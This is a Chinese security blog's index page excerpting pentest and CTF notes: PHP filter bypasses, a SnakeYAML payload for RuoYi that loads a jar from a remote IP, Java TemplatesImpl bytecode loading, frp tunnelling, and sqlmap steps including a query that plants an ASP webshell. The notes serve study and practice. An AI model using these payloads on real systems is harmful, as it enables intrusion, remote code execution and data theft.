<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">260</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/11/15/2022Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/">2022Dest0g迎新赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-11-15</time><div class="content"><p>##phpdest<br><img src="/.com//2022-09-21-20-44-27.png"><br>绕过require_once限制</p>
<ul>
<li>/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接<br>payload:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self</span><br></pre></td></tr></table></figure>
##EasyPHP<br>在这里可以看到自定义了一个报错，当产生错误的时候，就会执行这个报错内容<br><img src="/.com//2022-09-21-21-22-31.png"><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_error_handler(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span>(<span class="params">&amp;$fl4g</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> $fl4g;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<img src="/.com//2022-09-21-21-20-11.png"><br>前面的代码都是干扰，我们重点需要关注的其实是我们的输入会做出什么操作，可以发现，我们输入的内容最后会和$fl4g做拼接操作，结合前面的自定义报错，那我们只需要让输入的内容为数组即可，因为数组和字符串直接拼接时会产生报错</li>
<li>突然想到之前，如果不知道题目的考察点，数组啥的都先试试再说<br>##simplerce</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/11/08/ruoyi%E5%90%8E%E5%8F%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/">ruoyi后台计划任务写入内存吗</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-11-08</time><div class="content"><p><a target="_blank" rel="noopener" href="http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar">http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar</a></p>
<p>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“<a target="_blank" rel="noopener" href="http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&quot;]]]]&#39;">http://110.42.133.120/java/yaml-payload-for-ruoyi/target/yaml-payload-for-ruoyi-1.0-SNAPSHOT.jar&quot;]]]]&#39;</a>)</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/09/20/java%E5%AD%97%E8%8A%82%E7%A0%81/">java-字节码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-09-20</time><div class="content"><h2 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h2><p>其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中</p>
<p>更广义上来说，所有能恢复成一个类并在jvm虚拟机里加载的字节序列，都在我们的探讨范围内。</p>
<h2 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h2><p><code>ClassLoader:</code></p>
<p>​    是用来加载字节码文件最基础的方法，是一个加载器，告诉java虚拟机如何加载这个类，java默认的ClassLoader就是根据类名来加载类，，并且类名是<code>类完整路径</code>，如<code>java.lang.Runtime</code>。</p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code>实际上是我们平时默认使用的<code>AppClassLoader</code>的父类，所以，<code>URLClassLoader</code>=java类加载器的工作流程</p>
<p>正常情况下，Java会根据配置项<code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载，而这个基础路径有三种情况:</p>
<ul>
<li>URL未以斜杠<code>/</code>结尾，则认为是一个JAR文件，使用<code>JarLoader</code>来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠<code>/</code>结尾，且协议名是<code>file</code>，则使用<code>FileLoader</code>来寻找类，即为在本地文件系统中寻找.class文件</li>
<li>URL以斜杠<code>/</code>结尾，且协议名不是<code>file</code>，则使用最基础的<code>Loader</code>来寻找类。</li>
</ul>
<h3 id="java的URL支持哪些协议"><a href="#java的URL支持哪些协议" class="headerlink" title="java的URL支持哪些协议"></a>java的URL支持哪些协议</h3><p>JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持</p>
<h2 id="Loader寻找类"><a href="#Loader寻找类" class="headerlink" title="Loader寻找类"></a><code>Loader</code>寻找类</h2><p>loader寻找类，最常见的情况就是<code>http</code>协议。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class classloader &#123;</span><br><span class="line">    public static void main(String[] args ) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls&#x3D;&#123;new URL(&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;&quot;)&#125;;</span><br><span class="line">        URLClassLoader loader &#x3D; URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c &#x3D;loader.loadClass(&quot;ex_1&quot;);</span><br><span class="line">        c.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220727152411.png" alt="image-20220727152404028" style="zoom:67%;">

<h2 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h2><p>java加载远程class文件/本地class或jar文件</p>
<p><code>ClassLoader#loadClass</code> ——&gt; <code>ClassLoader#findClass</code> ——&gt;<code>ClassLoader#defineClass</code></p>
<p>其中:</p>
<ul>
<li><code>Loadclass</code>的作用是从已加载的类缓存，父加载器等位置寻找类（双亲委派机制）</li>
<li><code>findClass</code>的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包、或远程http服务器上读取字节码，然后交给<code>defineClass</code></li>
<li><code>defineClass</code>的作用是处理前面传入的字节码，将其处理为真正的java类</li>
</ul>
<p><strong>defineClass可以从byte[]还原出一个Class对象</strong></p>
<p>使用<code>defineClass</code>直接加载字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] code=Base64.getDecoder().decode(<span class="string">&quot;字节码内容&quot;</span>);</span><br><span class="line">        Class hello = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;Hello&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用TemplatesImpl加载字节码"><a href="#使用TemplatesImpl加载字节码" class="headerlink" title="使用TemplatesImpl加载字节码"></a>使用TemplatesImpl加载字节码</h2><h3 id="TransletClassLoader"><a href="#TransletClassLoader" class="headerlink" title="TransletClassLoader"></a>TransletClassLoader</h3><p>TransletClassLoader来自<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p>其中重写了<code>defineClass</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123; </span><br><span class="line"><span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在重写的这个方法中，由于其没有显式声明作用域，，所以其作用域为default，所以也就是说这里的<code>defineClass</code>由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p>
<p>而<code>TransletClassLoader#defineClass()</code>向前追溯调用链为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>利用<code>newTransformer()</code>构造poc：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">	<span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">	TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">	setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">	setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">	setFieldValue(obj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">	obj.newTransformer();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>setFieldValue</code>方法来设置私有属性，其中_bytecodes、_name和_tfactory._bytecodes是由字节码组成的数组；_name可以是任意字符串，只要不为null即可。</p>
<p>_tfactory需要是一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses()</code>方法里有调用到<code>\_tfactory.getExternalExtensionsMap()</code>如果是null会出错</p>
<p><code>TemplatesImpl</code>中对加载的字节码有一定要求即，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</p>
<p>所以，我们需要构造一个特殊的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM; <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException; <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; <span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; <span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125; </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125; </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImpl</span><span class="params">()</span> </span>&#123; </span><br><span class="line">	<span class="keyword">super</span>(); </span><br><span class="line">	System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它继承了<code>AbstractTranslet</code>类，并在构造函数里插入Hello的输出，将其编译成字节码，即可被<code>TemplatesImpl</code>执行</p>
<h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.govuln; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.Repository; </span><br><span class="line"></span><br><span class="line">public class HelloBCEL &#123; </span><br><span class="line">	public static void main(String []args) throws Exception &#123; </span><br><span class="line">	JavaClass cls &#x3D; Repository.lookupClass(evil.Hello.class); </span><br><span class="line">	String code &#x3D; Utility.encode(cls.getBytes(), true); </span><br><span class="line">	System.out.println(code); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/09/14/java%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81/">java字节码</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-09-14</time><div class="content"><p>##字节码<br>能够恢复成一个类并在jvm中加载的字节序列<br>##利用URLClassLoader加载远程class文件<br><code>ClassLoader</code>是java的类加载器，告诉java虚拟机如何加载这个类，默认根据类名加载类，并且这个类名是类完整路径，例如java.lang.Runtime<br>###URLClassLoader<br>正常情况下，java会根据sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URl类）来寻找.class文件进行加载,基础路径有三种情况</p>
<ul>
<li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li>
<li>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类<br>###defineClass<br>在加载远程class文件、本地class或者jar包时，java都经历了<br><img src="/.com//2022-11-30-19-39-00.png"><br>其中</li>
<li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li>
<li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在<br>本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass </li>
<li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类<br>###defineClass加载字节码<br>####使用反射进行加载<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Method defineclass &#x3D; ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class,byte[].class,int.class,int.class);</span><br><span class="line">defineClass,setAccessible(true);</span><br><span class="line">byte[] code&#x3D; Base64.getDecoder().decode(&quot;&quot;);</span><br><span class="line">Class hello &#x3D; (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;hello&quot;,code,0,code.length);</span><br><span class="line">hello.newInstance();</span><br></pre></td></tr></table></figure>
####利用TemplatesImpl加载字节码<br><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<br>TransletClassLoader ：<br><img src="/.com//2022-11-30-19-50-00.png"><br>重写了<code>defineClass</code>方法，并且没有显式地声明其定义域。如果没有显式声明，则其作用域为default，可以被类外部调用，而<code>TransletClassLoader#defineClass()</code>向前追溯调用链以后可以发现，其最前面的两个方法为法 TemplatesImpl#getOutputProperties() 、 TemplatesImpl#newTransformer()<br>#####使用newTransformer()构造poc<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] code=Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl);</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>
其中：<br>setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。<br>_bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可；<br>_tfactory 需要是一个 TransformerFactoryImpl 对象，因为<br>TemplatesImpl#defineTransletClasses() 方法里有调用到<br>_tfactory.getExternalExtensionsMap() ，如果是null会出错。<br>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须<br>是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。<br>因此在构造这个类的时候要写extends<br><img src="/.com//2022-11-30-20-03-01.png"></li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/08/18/php%E4%B8%ADopcache%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/">php中opcache特性利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-08-18</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/08/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计小记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-08-09</time><div class="content"><p>##可访问文件收集<br>如果存在反序列化，这里可以直接利用<br>.//wp-content/plugins/product-import-export-for-woo/admin/modules/product_tags/import/import.php:272 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
<p>如果可以覆盖文件写入的话<br>.//wp-content/plugins/woocommerce-germanized/vendor/globalcitizen/php-iban/php-iban.php:607 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/07/05/%E4%BD%BF%E7%94%A8frp%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">使用frp进行流量转发</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-07-05</time><div class="content"><h4 id="为什么使用FRP"><a href="#为什么使用FRP" class="headerlink" title="为什么使用FRP"></a><strong>为什么使用FRP</strong></h4><p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p>
<ul>
<li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li>
<li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li>
<li>代理组间的负载均衡。</li>
<li>端口复用，多个服务通过同一个服务端端口暴露。</li>
<li>多个原生支持的客户端插件(静态文件查看，HTTP、SOCK5 代理等)，便于独立使用 frp 客户端完成某些工作。</li>
<li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li>
<li>服务端和客户端 UI 页面。</li>
</ul>
<h2 id="FRP实现原理"><a href="#FRP实现原理" class="headerlink" title="FRP实现原理"></a>FRP实现原理</h2><p><strong>frp 主要由客户端(frpc)和服务端(frps)组成，服务端通常部署在具有公网 IP 的机器上，客户端通常部署在需要穿透的内网服务所在的机器上</strong>内网没有公网ip，所以使用公网服务器搭载frp，内网反连公网frp，其他人需要访问内网的发起请求时，通过frp的代理到达内网</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1.frps frp 服务端的配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_port &#x3D; 7000</span><br></pre></td></tr></table></figure>

<p>2.frpc frp客户端，也就是你要访问的机器</p>
<p>配置：</p>
<p>server_addr是服务端的ip，server_port是服务端开放的端口，token就是token，到时候配置的代理，ip是服务器的ip，端口走的是7004，也就是remote_port</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.137.182</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; 9283eae321d</span><br><span class="line">tls_enable&#x3D;true</span><br><span class="line"> </span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">remote_port &#x3D; 7004</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>

<p>指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_full.ini</span><br><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/01/sqlmap%E6%8C%87%E4%BB%A4/">sqlmap指令</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-01</time><div class="content"><p>##access数据库+sqlmap指令<br>###get类型注入<br>1.检测是否存在注入点：<br><code>&#39;</code>、<code>and 1=1</code>、<code>and 1=2</code>、<br>2.使用sqlmap进行检测注入点是否可用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u url</span><br></pre></td></tr></table></figure>
<p>3.完整的access+sqlmap注入指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个完整的access注入过程命令</span><br><span class="line"></span><br><span class="line">（1）注入点判断：sqlmap.py-u http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1</span><br><span class="line"></span><br><span class="line">（2）猜数据库表:sqlmap.py -u http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1 –tables</span><br><span class="line"></span><br><span class="line">输入线程：10，回车后开始跑表，找到合适的表后，按下ctrl+c终止跑表。</span><br><span class="line"></span><br><span class="line">（3）对某个表进行字段猜解</span><br><span class="line"></span><br><span class="line">sqlmap.py-u ” http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1” –tables –columns -Tadmin</span><br><span class="line"></span><br><span class="line">例如获取admin表的字段如下： id,username,password</span><br><span class="line"></span><br><span class="line">（4）对admin表字段内容进行猜解</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot; http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1&quot;--dump -T admin -C &quot;username,password&quot;  </span><br><span class="line">（5）获取明文密码或者加密密码。通过cmd5.com等在线网站进行明文密码破解。</span><br><span class="line"></span><br><span class="line">（6）寻找后台地址，并登录后台</span><br><span class="line"></span><br><span class="line">（7）通过后台管理寻求可以获取webshell的功能模块，尝试获取webshell。</span><br><span class="line"></span><br><span class="line">知道web真实路径，且可以通过脚本执行查询，则可以通过查询来获取webshell，例如网站真实路径：d:\freehost\fred200903\web\，则查询语句为：</span><br><span class="line"></span><br><span class="line">SELECT &#39;&lt;%execute request(&quot;a&quot;)%&gt;&#39; into [a] in &#39; d:\freehost\fred200903\web\x.asp;a.xls&#39;&#39;excel 8.0;&#39; from a</span><br><span class="line">Shell地址：http:&#x2F;&#x2F;www.somesite.com&#x2F; x.asp;a.xls，一句话后门密码a。</span><br></pre></td></tr></table></figure>
<p>###POST类型注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Accesspost登录框注入</span><br><span class="line"></span><br><span class="line">注入点：http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp</span><br><span class="line"></span><br><span class="line">（1）通过burpsurte抓包保存为txt文件，使用sqlmap进行自动注入</span><br><span class="line"></span><br><span class="line">例如对着注入点使用burp抓包，保存tg .txt文件，使用命令：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py-r tg.txt -p tfUPass</span><br><span class="line">（2）自动搜索表单的方式   </span><br><span class="line"></span><br><span class="line">sqlmap-u http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp –forms</span><br><span class="line"></span><br><span class="line">（3）指定一个参数的方法</span><br><span class="line"></span><br><span class="line">sqlmap-u http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp --data &quot;tfUName&#x3D;1&amp;tfUPass&#x3D;1&quot;</span><br><span class="line">2.Cookie注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;news.asp&quot;--cookie &quot;id&#x3D;1&quot; --table --level 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.sqlmap -r test.txt<br>判断是否存在注入点，test.txt中对注入点记得加个*号来做一下标记<br>2.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">渗透测试备忘录—信息搜集</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-20</time><div class="content"><h2 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h2><ul>
<li>ASP+ACCESS + II5.0/6.0+Windows server 2003</li>
<li>ASPX+Mssql+iis 7.0/7.5+ Windows server 2008</li>
<li>PHP+MYSQL+IIS</li>
<li>PHP+MYSQL+Apache</li>
<li>PHP+MYSQL+IIS</li>
<li>JSP+MYSQL+Nginx</li>
<li>JSP+Mssql+Tomcat</li>
<li>Jsp+oracle+Tomcat</li>
</ul>
<h2 id="域环境判断"><a href="#域环境判断" class="headerlink" title="域环境判断"></a>域环境判断</h2><p>1.</p>
<p>查看网关IP地址、Dns的IP地址、域名、本机是否和DNS服务器处于同一网段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>

<p>然后过反向解析查询命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上</p>
<p>2.查看系统详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p>域如果为WORKGROUP，则表示服务器不在域内。</p>
<p>3.查询当前登录域及登录用户信息</p>
<p>“工作站域DNS名称”如果为WORKGROUP，则表示为非预环境，”登录域“用于表示当前登录的用户是域用户还是本地用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p>4.判断主域</p>
